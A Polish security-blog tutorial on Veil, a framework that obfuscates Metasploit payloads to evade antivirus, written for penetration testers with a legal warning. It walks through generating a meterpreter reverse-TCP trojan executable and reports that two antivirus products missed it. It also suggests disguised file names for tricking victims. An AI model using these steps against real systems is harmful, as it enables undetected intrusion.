Jak wiadomo, antywirusy nie są doskonałe. Złośliwe oprogramowanie potrafią wykryć dopiero po kilku latach od infekcji, jak to miało miejsce m.in. w przypadku Stuxnetu, a czasem wręcz świadomie nie chronią przed pewnymi przypadkami znanych od lat wirusów. Niemniej jednak, to właśnie program antwirusowy jest pierwszą przeszkodą jaką zazwyczaj napotka atakujący, któremu udało się znaleźć podatność w systemie ofiary i po jej udanym “wykorzystaniu” chciałby przejść do uruchomienia swojego złośliwego (shell) kodu. Czy zatem da się jakoś oszukać antywirusa i pozostać niewykrytym? Tak — i w tym artykule zajmiemy się opisem nowopowstałego frameworka, którego celem jest oszukać antwirusa i ułatwić wykonywanie testów penetracyjnych. Autorem artykułu jest Krzysiek Nowak, jeden z pentesterów Niebezpiecznika a także trener szkolenia Bezpieczeństwo Sieci Komputerowych (testy penetracyjne) — najbliższa edycja tego szkolenia odbędzie się w Warszawie 5-7 marca, zostało jeszcze 5 wolnych miejsc. Kto pierwszy, ten lepszy ;) Niniejszy artykuł ma charakter wyłącznie edukacyjny. Należy pamiętać, aby nie wykonywać testów penetracyjnych na sieciach i systemach, które nie należą do was lub co do których nie uzyskaliśmy odpowiedniej zgody od właściciela. Czym grozi nielegalne wykonywanie testów penetracyjnych? O tym pisaliśmy w jednym z “Poniedziałków z Prawnikiem“. Czym jest Veil? Veil jest frameworkiem, który automatyzuje proces zaciemniania (obfuskacji) shellcode’u trojanów wygenerowanych przy użyciu metasploita. Dzięki niemu, złośliwe oprogramowanie nie wzbudzi alarmu w trakcie skanu antywirusem. Być może niektórzy z was już spotkali się z podobnymi narzędziami (lub napisali własne). Veil jest projektem, który daje wam możliwość podejrzenia, z jakich technik korzystają inni, a dodatkowo pozwoli na włączenie się w rozwój tego frameworka — Veil to open source i każdy może zostać jego deweloperem. Dlaczego w ogóle powstał Veil? Wydawać by się mogło, że powstanie Veila ma tylko i wyłącznie negatywne skutki — tj. pomoc script kiddsom w generowaniu niewykrywalnych trojanów. Twórcy Veila twierdzą jednak, że narzędzie to podniesie efektywność testów penetracyjnych, ponieważ obecnie pentesterzy rezygnują z demonstrowania omijania systemów antywirusowych ze względu na ograniczony czas badania (nie każdy z klientów chce sfinansować tworzenie niewykrywalnego przez antywirusy kodu exploita, a popularne packery oraz sam metasploit są całkiem dobrze wykrywany przez antywirusy). Veil zresztą może też pomóc samym producentom antywirusów — w końcu widzą jego kod i stosowane techniki. Instalacja Instalację przeprowadzimy na dystrybucji Kali. Nie jest to trudne; Veil posiada wygodny instalator, który samodzielnie sprawdza zależności oraz instaluje wymagane pakiety. Niestety, nie radzi sobie z konfliktami i aktualizacją samego Kaliego, dlatego zacznijmy od przygotowania samego systemu: root@kali:~# apt-get update && apt-get upgrade -y UWAGA: zdarza się, że Kali zatrzymuje niektóre pakiety z uwagi na ich niekompatybilność: root@kali:~# apt-get upgrade Reading package lists... Done Building dependency tree Reading state information... Done The following packages have been kept back: greenbone-security-assistant kali-linux libfreefare-bin libfreefare0 libnfc-bin mfcuk mfoc mfterm 0 upgraded, 0 newly installed, 0 to remove and 8 not upgraded. Aby rozwiązać ten problem, najprościej po prostu odinstalować powyższe pakiety bez czyszczenia ich konfiguracji (apt-get remove pakiet lub aptitude upgrade, który dużo lepiej radzi sobie z rozwiązywaniem problemów w repozytorium). Po “czyszczeniu” warto zweryfikować poprzez: apt-get upgrade, czy system nie wstrzmuje paczek, lub nie chce jeszcze czegoś instalować. Jeśli problemy zostały rozwiązane, możemy zająć się właściwą instalacją. W tym miejscu możemy wybrać 2 podejścia: 1. apt do instalacji pakietu ‘veil’ 2. git do sklonowania repozytorium Którą opcję wybrać? Jeśli chcemy w wygodny sposób aktualizować Veila, to warto skorzystać z opcji 1. Dzięki temu przy kolejnej aktualizacji apt-get wszystkie pakiety zostaną automatycznie podniesione do najnowszej wersji. Jeśli zależy nam na szybkim dostępie do najnowszych zmian w repozytorium Veil, wybierzmy podejście 2. Projekt rozwija się bardzo dynamicznie i z dnia na dzień gromadzi coraz więcej ludzi, dlatego zmiany wprowadzane do projektu Veil znacznie wyprzedzają te wprowadzane do paczek Kaliego. W przypadku opcji 2 na początek należy sklonować oficjalne repo, pamiętając aby instalację wykonać z GUI. Dlaczego GUI? Instalator Veila korzysta z Wine do zainstalowania pythona dla Windowsa oraz kilku pluginów: python 2.5.7, pycrypto, pyinstaller. root@kali:~# git clone https://github.com/veil-evasion/Veil root@kali:~# cd Veil/setup root@kali:~# ./setup.sh Jeśli proces instalacji zakończył się prawidłowo (przewiń okno konsoli i sprawdź, czy nie ma tam błędów) można przejść do generowania kodu. Tworzenie niewykrywalnego wirusa/trojana/backdoora W poniższym przykładzie wygenerujemy trojana dla Windowsa, który po wykonaniu na komputerze ofiary utworzy proces notepad.exe i zmigruje się do niego. root@kali:~# cd Veil/ root@kali:~/Veil# ./Veil.py Do tworzenia trojana wykorzystaj jeden z dostępnych payloadów: [*] Available payloads: 1) c/meterpreter/rev_tcp 2) c/meterpreter/rev_tcp_service 3) c/shellcode_inject/virtual 4) c/shellcode_inject/void 5) cs/meterpreter/rev_tcp 6) cs/shellcode_inject/base64_substitution 7) cs/shellcode_inject/virtual 8) native/Hyperion 9) native/backdoor_factory 10) native/pe_scrambler 11) powershell/shellcode_inject/download_virtual 12) powershell/shellcode_inject/psexec_virtual 13) powershell/shellcode_inject/virtual 14) python/meterpreter/rev_http_contained 15) python/meterpreter/rev_https_contained 16) python/meterpreter/rev_tcp 17) python/shellcode_inject/aes_encrypt 18) python/shellcode_inject/arc_encrypt 19) python/shellcode_inject/base64_substitution 20) python/shellcode_inject/des_encrypt 21) python/shellcode_inject/flat 22) python/shellcode_inject/letter_substitution Nas interesuje połączenie zwrotne meterpretera na porcie 8080, wybieramy więc opcję 16 (lub python/meterpreter/rev_tcp). Oto opcje payloadu: Payload: python/meterpreter/rev_tcp loaded Required Options: Name Current Value Description ---- ------------- ----------- LHOST IP of the metasploit handler LPORT 4444 Port of the metasploit handler compile_to_exe Y Compile to an executable expire_payload X Optional: Payloads expire after "X" days use_pyherion N Use the pyherion encrypter Available commands: set set a specific option value info show information about the payload generate generate payload back go to the main menu exit exit Veil [>] Please enter a command: Zmianom należy poddać parametry: LHOST oraz LPORT tak, aby wskazywały na nasz host oraz port, który wcześniej wybraliśmy: [>] Please enter a command: set LHOST 172.16.10.11 [>] Please enter a command: set LPORT 8080 W przypadku wyboru adresu IP, jeśli nie pamiętamy jaki jest obecnie używany w systemie, wcale nie trzeba wychodzić do osobnej konsoli i sprawdzać ifconfig. Veil obsługuje auto-uzupełnianie (klawisz TAB) Teraz możemy wygenerować wykonywalny kod komendą generate :-) [>] Please enter a command: generate [*] Press [enter] for 'payload' [>] Please enter the base name for output files: trojan.exe [?] How would you like to create your payload executable? 1 - Pyinstaller (default) 2 - Py2Exe [>] Please enter the number of your choice: 1 err:winediag:SECUR32_initNTLMSP ntlm_auth was not found or is outdated. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution. 51 INFO: wrote Z:\root\Veil\trojan.exe.spec 72 INFO: Testing for ability to set icons, version resources... 74 INFO: ... resource update available 78 INFO: UPX is not available. 1302 INFO: checking Analysis 1302 INFO: building Analysis because out00-Analysis.toc non existent 1302 INFO: running Analysis out00-Analysis.toc 1304 INFO: Adding Microsoft.VC90.CRT to dependent assemblies of final executable 1305 INFO: Searching for assembly x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.21022.8_x-ww ... 1305 INFO: Found manifest C:\windows\WinSxS\Manifests\x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.21022.8_x-ww_d08d0375.manifest 1306 INFO: Searching for file msvcr90.dll 1308 INFO: Found file C:\windows\WinSxS\x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.21022.8_x-ww_d08d0375\msvcr90.dll 1308 INFO: Searching for file msvcp90.dll 1308 INFO: Found file C:\windows\WinSxS\x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.21022.8_x-ww_d08d0375\msvcp90.dll 1308 INFO: Searching for file msvcm90.dll 1309 INFO: Found file C:\windows\WinSxS\x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.21022.8_x-ww_d08d0375\msvcm90.dll 1410 INFO: Analyzing Z:\opt\pyinstaller-2.0\support\_pyi_bootstrap.py 2660 INFO: Analyzing Z:\opt\pyinstaller-2.0\PyInstaller\loader\archive.py 2822 INFO: Analyzing Z:\opt\pyinstaller-2.0\PyInstaller\loader\carchive.py 2999 INFO: Analyzing Z:\opt\pyinstaller-2.0\PyInstaller\loader\iu.py 3039 INFO: Analyzing /root/veil-output/source/trojan.exe.py 3200 INFO: Hidden import 'encodings' has been found otherwise 3200 INFO: Looking for run-time hooks 3202 INFO: Analyzing rthook Z:\opt\pyinstaller-2.0\support/rthooks/pyi_rth_encodings.py 3604 INFO: Warnings written to Z:\root\Veil\build\pyi.win32\trojan.exe\warntrojan.exe.txt 3607 INFO: checking PYZ 3607 INFO: rebuilding out00-PYZ.toc because out00-PYZ.pyz is missing 3607 INFO: building PYZ out00-PYZ.toc 4150 INFO: checking PKG 4150 INFO: rebuilding out00-PKG.toc because out00-PKG.pkg is missing 4150 INFO: building PKG out00-PKG.pkg 5078 INFO: checking EXE 5078 INFO: rebuilding out00-EXE.toc because trojan.exe.exe missing 5078 INFO: building EXE from out00-EXE.toc 5081 INFO: Appending archive to EXE Z:\root\Veil\dist\trojan.exe.exe [*] Executable written to: /root/veil-output/compiled/trojan.exe.exe Language: python Payload: python/meterpreter/rev_tcp Required Options: LHOST=172.16.10.11 LPORT=8080 compile_to_exe=Y expire_payload=X use_pyherion=N Payload File: /root/veil-output/source/trojan.exe.py Handler File: /root/veil-output/handlers/trojan.exe_handler.rc [*] Your payload files have been generated, don't get caught! [!] And don't submit samples to any online scanner! ;) I gotowe. Veil w katalogu /root/veil-output zostawił kilka danych: 1. /root/veil-output/compiled/trojan.exe.exe – plik wykonywalny, do podrzucenia ofierze 2. /root/veil-output/handlers/trojan.exe_handler.rc – gotowiec dla metasploita odpalający konsolę na porcie 8080 (msfconsole -r /root/veil-output/handlers/trojan.exe_handler.rc) 3. /root/veil-output/source/trojan.exe.py – kod trojana w pythonie, wraz z payloadem I to właściwie wszystko. Teraz należy użyć swoich umiejętności aby nakłonić ofiarę do uruchomienia ww. pliku oraz czekać na sesję meterpretera. Pomóc mogą banalne triki, takie jak zmiana nazwy pliku (płace.xls.exe lub gta_crack.exe) oraz jego ikony, gdyż za każdym razem exe będzie posiadał domyślną grafikę dla pythona: Alternatywnym rozwiązaniem oczywiście będzie “wyexploitowanie” systemu ofiary przy pomocy jakiejś podatności (np. ataku plikem PDF), a następnie samodzielnie uruchomienie ww. kodu w systemie ofiary …lub skorzystanie z Veil-Catapult, czyli nowej funkcjonalności Veila, która skupia się właśnie na rozwiązaniu problemu “dostarczenia” złośliwego kodu na komputer ofiary. Które AV dają się oszukać? Specjalnie nie wysyłałem trojanów do serwisów typu VirusTotal (to mogłoby sprawić, że sygnatury dla pliku pojawią się w następnej aktualizacji programu antywirusowego). Plik trojana został więc sprawdzony lokalnie przy pomocy ESET Smart Security oraz Symatec Endpoint Protection z bazą wirusów na dzień 2013-12-27 (dzień tworzenia artykułu) i programy te nie wykryły żadnego zagrożenia. Inaczej sprawa ma się w przypadku wykonania niektórych komend już w samym meterpreterze. Tutaj trzeba uważać, by np komendą metsvc nie zdradzić swojej obecności w systemie. Na marginesie, jeśli kogoś kusi jednak sprawdzenie wykrywalności w VirusTotalu, to warto skorzystać z SHA1 generowanego za każdym razem, kiedy Veil tworzy plik wykonywalny i komendy checkvt wprowadzona w rewizji 6a78658fd3a7f7153800cc9f989e55f7ee543151. [>] Please enter a command: checkvt [*] Checking Virus Total for payload hashes... [*] No payloads found on VirusTotal! Co jeszcze potrafi Veil? Sporo. Kod generowany Veilem można podpiąć pod inne, “oryginalne” pliki exe — przestępcy często doklejają swoje złośliwe oprogramowanie do instalatorów popularnego oprogramowania, które następnie udostępniają w internecie (np. na torrentach). Dodatkowo, właśnie uruchomiono “podprojekt” Veil-Catapult, który skupia się właśnie na dostarczaniu payloadu na komputer ofiary przy pomocy kilku technik. Aby dowiedzieć się czegoś więcej na temat Veila warto obejrzeć tutoriale video oraz najświeższe slajdy z konferencji ShmooCon (zapis video podobnego wykładu twórców Vaila jest tutaj). Autorem artykułu jest Krzysiek Nowak, jeden z pentesterów Niebezpiecznika a także trener szkolenia Bezpieczeństwo Sieci Komputerowych (testy penetracyjne) — najbliższa edycja tego szkolenia odbędzie się w Warszawie 5-7 marca, i zostało tylko 5 wolnych miejsc. Kto pierwszy, ten lepszy ;) ,Krzysztof Nowak